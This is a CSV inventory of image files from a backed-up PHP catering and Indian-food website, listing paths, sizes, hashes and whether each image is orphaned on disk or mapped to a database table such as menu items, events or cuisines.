1754286241_IMG_5056.png,old-website-php/Full-website-backup/frontEnd/blog/Images/1754286241_IMG_5056.png,209520,b70a33e3cba2778d618095469fc56c71ba6b0c7dd58933d59c10a97f02cddc9d,c2222e21b5a817c6a882f85e26d03a0b,Static / Orphaned Disk Asset,,,,
1754286518_30e6001e-74b6-49d2-8296-fef24dcd4f73_15_96110-171238663085318.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1754286518_30e6001e-74b6-49d2-8296-fef24dcd4f73_15_96110-171238663085318.jpeg,56832,8f01481524b967c32b4ec11fe5a02de0a8a1f9f92672129bca2aaffc92fd159e,628f771b34996e03779b4c52998d1812,Static / Orphaned Disk Asset,,,,
1754719305_Paneer Do pyaza.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1754719305_Paneer Do pyaza.jpeg,903036,2c33ddbb4c6e9697f2a6fd6bac5859de8cae7644df1dfcd34a2e73a88f4d3b85,d6394b979771d4aae71c2ac282002207,Static / Orphaned Disk Asset,,,,
1755332416_Siddu.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1755332416_Siddu.jpg,3039500,58ee9428d1ac4418f21f536da5a2383581d27017ab84b819c060a88bc52f7628,4cd140cb96064abf24afebe4ec377790,Static / Orphaned Disk Asset,,,,
1755616602_Pateed.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1755616602_Pateed.jpg,221823,2cfdd2a6665a5b20cd7da713e7026bb5bcbda18561b742660f14c47748249eb2,c82f070baa2699158d0f029ca0203834,Static / Orphaned Disk Asset,,,,
1755689333_Juliana Silva Present.png,old-website-php/Full-website-backup/frontEnd/blog/Images/1755689333_Juliana Silva Present.png,1379646,e54a0a428d321c69cb4fcdb720c072fa9a3eb48153000a4d47daa5f737d5dbda,c99eaeeaa38058da9f478596c61b51dd,Static / Orphaned Disk Asset,,,,
1756127010_Juliana Silva Present.png,old-website-php/Full-website-backup/frontEnd/blog/Images/1756127010_Juliana Silva Present.png,1036942,5157e681e73e85e7a45fb7fecfeb8e359bc6f15be618079fea84c9cd286cd6a1,b83f3f41a504c2c7d7779ef006e259af,Static / Orphaned Disk Asset,,,,
1756127817_Juliana Silva Present.png,old-website-php/Full-website-backup/frontEnd/blog/Images/1756127817_Juliana Silva Present.png,1036942,5157e681e73e85e7a45fb7fecfeb8e359bc6f15be618079fea84c9cd286cd6a1,b83f3f41a504c2c7d7779ef006e259af,Static / Orphaned Disk Asset,,,,
1756264185_modak.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1756264185_modak.jpeg,746043,f890ee6c64b82645ae57a4343d9cb1c20677ecb63d42a87024df40516dbab7c5,48f900e7242a53567cc7bc253fbdd57d,Static / Orphaned Disk Asset,,,,
1756649148_Chole Bhature.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1756649148_Chole Bhature.jpeg,687962,4bfb5b63caa8905811e340e0a28d8bb8a2d56a39900ca581085ef63091f93bb0,acf56cbbb78f3784ecd2c5f8b07d6539,Static / Orphaned Disk Asset,,,,
1757001644_sambar vada.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1757001644_sambar vada.jpeg,789406,9f4d1be3877295c4f5c7f239b808cfbf0939e93da412c8823fb819535925b47d,9ca15604f4b3e2d2baf57c5d97ec4dde,Static / Orphaned Disk Asset,,,,
1757401385_website banner(1343 x 588 px).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1757401385_website banner(1343 x 588 px).jpg,182439,ba2e8c32eaa77853a8f81e58093458330352a7f8b91dfda81752364180d98d62,be4e7c9e44b0d8856a7d1551f526d510,Static / Orphaned Disk Asset,,,,
1758535973_website banner(1343 x 588 px).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758535973_website banner(1343 x 588 px).jpg,140974,1f7698bb551a4c387a2b83b15e33e027da993459a8464fbea095c4ea91aff7f2,1a8828671b137d77dcf36e104f9e2e9c,Static / Orphaned Disk Asset,,,,
1758536158_website banner(1343 x 588 px) (1).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758536158_website banner(1343 x 588 px) (1).jpg,155831,f89a3c9f3d3f60a6b9b574f5b71f46f2b05f7be0bd64921f99ee5253814b8610,cbaedcc1206167c9a1d566ad26fbeaad,Static / Orphaned Disk Asset,,,,
1758713713_website banner(1343 x 588 px).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758713713_website banner(1343 x 588 px).jpg,661732,bb4c1a3d2aeee98b75331b21540100d7ad276c5f208b40259e4d147414267b8a,e0b9dacbfaa55d050c26e02ef53590b0,Static / Orphaned Disk Asset,,,,
1758713929_website banner(1343 x 588 px) (1).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758713929_website banner(1343 x 588 px) (1).jpg,529449,2ee3bbd7d1e4caccd5f2d810d703abfa3779838c89e8e9c64ed4eee8caeaa8b7,764947d338ed67cbd7bce753b4e9e230,Static / Orphaned Disk Asset,,,,
1758775523_website banner(1343 x 588 px) (2).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758775523_website banner(1343 x 588 px) (2).jpg,538555,4c9bd25ef6d36e7d8fb92bc1e9bdb2dc7e744457b1c30ef048f47d5130109f6e,0014df1311cdde4487cf17c517fe601f,Static / Orphaned Disk Asset,,,,
1758775632_website banner(1343 x 588 px) (3).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1758775632_website banner(1343 x 588 px) (3).jpg,405484,2b5e3c66fbb478c2bf2f09384b2ec633fa282e687382bee45ff5bbb9c83fb337,f880b6b46827aa38ee0a60dbf8b2474f,Static / Orphaned Disk Asset,,,,
1759333646_Bread Pakoda.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1759333646_Bread Pakoda.jpeg,831671,1a3e6001566d3fbec3e330f280b85f6c08907d2985404d7c9907a89d9d33d96c,1e5e533e8662507c6b44b9110daed7ea,Static / Orphaned Disk Asset,,,,
1760421012_Untitled design (42).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1760421012_Untitled design (42).jpg,653428,0bceb32e21f153af7cb36a0bfaa63f4613bd412ab40fc9b75dec25dca188ee4e,a198de8b250cdd8d44b857f45588ab39,Static / Orphaned Disk Asset,,,,
1760678557_Find Trusted Halwai for Wedding Near Me in Your City.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1760678557_Find Trusted Halwai for Wedding Near Me in Your City.jpg,118469,b01bdcb34455849019010c1c70d439152211355cd5b2b9627401e9608688a8da,3e0eec1e47af6bbcdd3eabcc1471676b,Static / Orphaned Disk Asset,,,,
1761113496_Find Trusted Halwai for Wedding Near Me in Your City (1).jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1761113496_Find Trusted Halwai for Wedding Near Me in Your City (1).jpg,111642,8d5d511184e90816bb174a5e9a3e27d7fef71f1922dd3be29fac47adf4a7b20d,42527769da3caf2bb22072e87ba77760,Static / Orphaned Disk Asset,,,,
1761282361_Find Trusted Halwai for Wedding Near Me in Your City.png,old-website-php/Full-website-backup/frontEnd/blog/Images/1761282361_Find Trusted Halwai for Wedding Near Me in Your City.png,874457,bee022f49a7f575901b001d6f6751ebaf8e510767c1d0bb340464b22f80bd029,d3d4a6dbd3417e36bd86c6e6353ddf40,Static / Orphaned Disk Asset,,,,
1765546578_Best Sweet to gift during Festival.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1765546578_Best Sweet to gift during Festival.jpg,220577,66e71baa4784f39ff0b6cbb4c467613ae6b98dd6119b668819cdc3e5ed5ad6ca,ff6910389f02dd5345904de60aaf2b8a,Static / Orphaned Disk Asset,,,,
1766416593_How much Catering to Order for small &Big Events.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1766416593_How much Catering to Order for small &Big Events.jpg,274060,8a3abb9046db8aa2c91246be30a3b59dd89d0cd6727f9a65af0ff0fcb0da6d03,dfde7ef118f1b40af694bd145cd51272,Static / Orphaned Disk Asset,,,,
1767446194_Top 5Traditional indian Sweet everyone Loves.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1767446194_Top 5Traditional indian Sweet everyone Loves.jpg,240555,0cfe1f5b2d06d431cccc03eac19183424e681b7898e0d7a7b043af84274dda84,8f73837c213eed8d073ef7b0a27776e1,Static / Orphaned Disk Asset,,,,
1768632795_Khchadi.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1768632795_Khchadi.jpg,97763,1c68edb989ba1ffd7e90b56e4420ee90819782ff7118bd4d3d6dbd5743182e03,ce11ab077f2de0648f040b8f27fc76bb,Static / Orphaned Disk Asset,,,,
1769158187_basant-panchami.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1769158187_basant-panchami.jpg.jpeg,531729,679a3359ed7540a3cd0f6e01bf50fa24ebcbe05e2e6952d60af85e081516510c,4c36883a9827773e58c8ae0a7bc8ac3c,Static / Orphaned Disk Asset,,,,
1772427989_TFH holi-banner.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1772427989_TFH holi-banner.jpg,569737,f0d04c7c8ecc9de9a2a67428dcd3bc05845d98855e479832761bd88c0f31c26e,1b98311153207703a4a84d85d8fec3a5,Static / Orphaned Disk Asset,,,,
1772977502_womens-day-banner.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1772977502_womens-day-banner.jpg.jpeg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
1773049001_womens-day-banner.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1773049001_womens-day-banner.jpg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
1776147352_happy-baisakhi.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1776147352_happy-baisakhi.jpg.jpeg,624274,1e128a4f8d8005432539c4d4f82600e26eb8831abaec8c920975f400d3d6ff5e,f992aba074510eeff9bf66fd464af60a,Static / Orphaned Disk Asset,,,,
1778420336_mothers-day.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1778420336_mothers-day.jpg.jpeg,375062,1fd5dccd4f6513831f47fcd0cf46e3d61aa6dfa302c05206bf81b16a3c862627,529900cd24f2f2446cbb0cf184769c90,Static / Orphaned Disk Asset,,,,
1780236314_why-should-you.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1780236314_why-should-you.jpg.jpeg,437434,e65c59a16c877aba9a535122fb29791a6ac89640f9569609f13a37c18ae87f40,ae1f7adfe9d28bfeaae51608441c20cc,Static / Orphaned Disk Asset,,,,
1781962675_yoga-day-banner.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1781962675_yoga-day-banner.jpg.jpeg,298627,fd443c3dec5047c460c2c74927de3657a00f19af80093198ca8aa1c4047d56da,6962901869f7bea224aca1b2ddb5785d,Static / Orphaned Disk Asset,,,,
1781963117_father-day-blog.jpg.jpeg,old-website-php/Full-website-backup/frontEnd/blog/Images/1781963117_father-day-blog.jpg.jpeg,526649,cc8339107685dbe988efafd68e776344df945a6a2cabe2b1166965fe1404bbd0,9c47bd34bf8eb446dba19b24032c421e,Static / Orphaned Disk Asset,,,,
1787577886_rakhi.jpg,old-website-php/Full-website-backup/frontEnd/blog/Images/1787577886_rakhi.jpg,466317,be9e0244e42703d71e3a2bdde81aa81add0220ea7c1d14dac125c51c498740f3,59a4aff3cd14d04c93c41f89c7b46cbd,Static / Orphaned Disk Asset,,,,
default-blog.png,old-website-php/Full-website-backup/frontEnd/blog/Images/default-blog.png,763,4be0d6bc433a58df6cccadaf4ba56726f38926b207d0e2063b3d761130092f68,2b3b8cf176628c0ef28fa029c3975be4,Static / Orphaned Disk Asset,,,,
arrows.png,old-website-php/Full-website-backup/frontEnd/blog/REVIEW SECTION/review/images/arrows.png,2276,f252fe5063fbe60837b3dcf7e0a407378a8288fb34526e55fad7cc34d3111ac2,a0b0d698e303261166a16351c0bcd1c1,Static / Orphaned Disk Asset,,,,
TESTIMONIAL Banner.jpg,old-website-php/Full-website-backup/frontEnd/blog/REVIEW SECTION/review/images/TESTIMONIAL Banner.jpg,107523,2adb6ef40b15b019023b9f91776cf0582a043a6cdf25787ebb62264adec46f6f,c7caa85c8e422e3d55aaba48778835c1,Static / Orphaned Disk Asset,,,,
user.png,old-website-php/Full-website-backup/frontEnd/blog/REVIEW SECTION/review/images/user.png,3949,8fe6bbd1274a9b8515a7203f51a677ff7d0dfda07e48b35fa1771fc8b7bc1c91,24649d29848400d01846000dc1324319,Static / Orphaned Disk Asset,,,,
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/1.jpg,31990,92498eaf1594caaaed2f84c7c3df262741222a9372a555555ec125606c3e812d,d9ec3fb966367ab4937027cf1c59e39f,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/10.jpg,11592,f061756f18983618fd18cfa9df24b9a55ca308959a2fd9ecb23717330631ad09,3fa2e0b7134d25ffbb763fe3f7bc4997,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/10.jpg,11592,f061756f18983618fd18cfa9df24b9a55ca308959a2fd9ecb23717330631ad09,3fa2e0b7134d25ffbb763fe3f7bc4997,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/10.jpg,11592,f061756f18983618fd18cfa9df24b9a55ca308959a2fd9ecb23717330631ad09,3fa2e0b7134d25ffbb763fe3f7bc4997,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/10.jpg,11592,f061756f18983618fd18cfa9df24b9a55ca308959a2fd9ecb23717330631ad09,3fa2e0b7134d25ffbb763fe3f7bc4997,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/2.jpg,14253,7c10750bc9e0469e2932eed112e5de7587916cac5130954e6919c6c19b17f92a,982b951e9349df17f930d7b840eebd05,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
3.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/3.jpg,15052,f6d6b391617641f570d3f7bf28e3da02e52bced30558bc3ac94bef418838e123,fcce79f306fd64bd948b5ae14b90d21f,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/3.jpg,15052,f6d6b391617641f570d3f7bf28e3da02e52bced30558bc3ac94bef418838e123,fcce79f306fd64bd948b5ae14b90d21f,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/3.jpg,15052,f6d6b391617641f570d3f7bf28e3da02e52bced30558bc3ac94bef418838e123,fcce79f306fd64bd948b5ae14b90d21f,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/3.jpg,15052,f6d6b391617641f570d3f7bf28e3da02e52bced30558bc3ac94bef418838e123,fcce79f306fd64bd948b5ae14b90d21f,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/3.jpg,15052,f6d6b391617641f570d3f7bf28e3da02e52bced30558bc3ac94bef418838e123,fcce79f306fd64bd948b5ae14b90d21f,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
4.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/4.jpg,17104,6aea4040a0c388845e2ac4ad952ef4d814ac4fc50f772a8aea191c1acd27b576,da3a6353239da8d6acc6346ff4b1cdec,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/4.jpg,17104,6aea4040a0c388845e2ac4ad952ef4d814ac4fc50f772a8aea191c1acd27b576,da3a6353239da8d6acc6346ff4b1cdec,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/4.jpg,17104,6aea4040a0c388845e2ac4ad952ef4d814ac4fc50f772a8aea191c1acd27b576,da3a6353239da8d6acc6346ff4b1cdec,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/4.jpg,17104,6aea4040a0c388845e2ac4ad952ef4d814ac4fc50f772a8aea191c1acd27b576,da3a6353239da8d6acc6346ff4b1cdec,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/4.jpg,17104,6aea4040a0c388845e2ac4ad952ef4d814ac4fc50f772a8aea191c1acd27b576,da3a6353239da8d6acc6346ff4b1cdec,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
5.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/5.jpg,14566,32f26a57b780dc11a62cb5e6147f91c33dd367bd1f9b1ae787854782011f8781,9ccdaf01ddf6acbdecddc6cce7e15e16,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/5.jpg,14566,32f26a57b780dc11a62cb5e6147f91c33dd367bd1f9b1ae787854782011f8781,9ccdaf01ddf6acbdecddc6cce7e15e16,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/5.jpg,14566,32f26a57b780dc11a62cb5e6147f91c33dd367bd1f9b1ae787854782011f8781,9ccdaf01ddf6acbdecddc6cce7e15e16,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/5.jpg,14566,32f26a57b780dc11a62cb5e6147f91c33dd367bd1f9b1ae787854782011f8781,9ccdaf01ddf6acbdecddc6cce7e15e16,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/6.jpg,12540,172f7f29b357046ccb5381daa8a7d98697def984476864d150cae482e9415df0,8831e629ba425b2394623673743c8c4f,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/7.jpg,16216,5d06bcde5a3aba7dcf00574c9d850f567996dd32bbb27a34697dd3357012777d,5cd829093524e951d286eba354fa4261,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/7.jpg,16216,5d06bcde5a3aba7dcf00574c9d850f567996dd32bbb27a34697dd3357012777d,5cd829093524e951d286eba354fa4261,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/7.jpg,16216,5d06bcde5a3aba7dcf00574c9d850f567996dd32bbb27a34697dd3357012777d,5cd829093524e951d286eba354fa4261,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/7.jpg,16216,5d06bcde5a3aba7dcf00574c9d850f567996dd32bbb27a34697dd3357012777d,5cd829093524e951d286eba354fa4261,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/7.jpg,16216,5d06bcde5a3aba7dcf00574c9d850f567996dd32bbb27a34697dd3357012777d,5cd829093524e951d286eba354fa4261,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/8.jpg,8994,1ec60c0ca3fe2f2778faa2cb738197f7f04fba81aa87dfc54a8e24497b8d29dd,9d244d894a80476122827dcd87226d5d,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/8.jpg,8994,1ec60c0ca3fe2f2778faa2cb738197f7f04fba81aa87dfc54a8e24497b8d29dd,9d244d894a80476122827dcd87226d5d,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/8.jpg,8994,1ec60c0ca3fe2f2778faa2cb738197f7f04fba81aa87dfc54a8e24497b8d29dd,9d244d894a80476122827dcd87226d5d,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/8.jpg,8994,1ec60c0ca3fe2f2778faa2cb738197f7f04fba81aa87dfc54a8e24497b8d29dd,9d244d894a80476122827dcd87226d5d,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/9.jpg,16190,14b5a1c464e6d12a93ed9b3dbc242f2068e8422ab9ddae7bcc41c14e9a325529,d8ac88f72b940db42c48d262de6e3cbc,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/9.jpg,16190,14b5a1c464e6d12a93ed9b3dbc242f2068e8422ab9ddae7bcc41c14e9a325529,d8ac88f72b940db42c48d262de6e3cbc,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/9.jpg,16190,14b5a1c464e6d12a93ed9b3dbc242f2068e8422ab9ddae7bcc41c14e9a325529,d8ac88f72b940db42c48d262de6e3cbc,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/cuisine/9.jpg,16190,14b5a1c464e6d12a93ed9b3dbc242f2068e8422ab9ddae7bcc41c14e9a325529,d8ac88f72b940db42c48d262de6e3cbc,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
doc_280.png,old-website-php/Full-website-backup/frontEnd/documents/doc_280.png,269731,6d322b237b0e608ac9dfd979171f7fb4cfc4d17c5915c2a7df4fc673018019da,c6f13593227cb5833d1ab5f9d1d4c183,Static / Orphaned Disk Asset,,,,
doc_714.png,old-website-php/Full-website-backup/frontEnd/documents/doc_714.png,13637,17c36a527b512bcf08163d8677fe73be628d42c65106683b2dca4df6809e133c,f37cd8b40f279ed75fe6a4f1a5c3acba,Static / Orphaned Disk Asset,,,,
1.png,old-website-php/Full-website-backup/frontEnd/event/1.png,171352,52a755ff3335cd0d033f3cc2a43720ea6feb3b3226575a334844a1cad41b1d91,38e0cc052e889a6576b3978f7efea8c2,DB Mapped (Verified),event_requirement,1,New Year Party,event_img
2.png,old-website-php/Full-website-backup/frontEnd/event/2.png,172289,a8c05d7a78be5b88e8fc5daca12cb4c155462c81c50d8e36d0503b0312c48d46,48b8d142775896cfb5f2f1a0b04896b8,DB Mapped (Verified),event_requirement,2,Christmas Party,event_img
3.png,old-website-php/Full-website-backup/frontEnd/event/3.png,116353,76c841196c7d0aa0cd702c17e67a516278a3e5b3e0e2519fce579b1ad7ef026f,705dfeaade58a35eb1d7e349aacbbdab,DB Mapped (Verified),event_requirement,3,Diwali Party/Puja,event_img
4.png,old-website-php/Full-website-backup/frontEnd/event/4.png,163706,dd943828407275d2d311eac078741e5390304ef56b478434130a9ce1d960abe9,99e16198dd59fa2b352d9ca4516a46ab,DB Mapped (Verified),event_requirement,4,Bhai Dooj,event_img
5.jpg,old-website-php/Full-website-backup/frontEnd/event/5.jpg,9595,7df5b7d9d72a8571f2aa8c07db5496d92a66f45056883e0ab89fed47d3d4084f,a551ca40731f8def9b82f836658df68a,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/event/5.jpg,9595,7df5b7d9d72a8571f2aa8c07db5496d92a66f45056883e0ab89fed47d3d4084f,a551ca40731f8def9b82f836658df68a,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/event/5.jpg,9595,7df5b7d9d72a8571f2aa8c07db5496d92a66f45056883e0ab89fed47d3d4084f,a551ca40731f8def9b82f836658df68a,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/event/5.jpg,9595,7df5b7d9d72a8571f2aa8c07db5496d92a66f45056883e0ab89fed47d3d4084f,a551ca40731f8def9b82f836658df68a,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
